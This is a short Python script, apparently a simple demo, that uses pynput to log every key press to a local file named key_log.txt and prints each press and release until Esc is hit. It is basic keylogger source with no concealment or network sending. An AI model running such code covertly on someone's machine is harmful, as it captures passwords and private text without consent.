import pynput
from pynput.keyboard import Key, Listener

key_list = []

def press_key(key):
    key_list.append(key)
    save_to_file(key_list)

    try:
        print('Character key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def save_to_file(key_list):
    with open('key_log.txt', 'w') as file:
        for key in key_list:
            key_str = str(key).replace("'", "")
            file.write(key_str)
            file.write(' ')

def release_key(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

with Listener(on_press=press_key, on_release=release_key) as listener:
    listener.join()
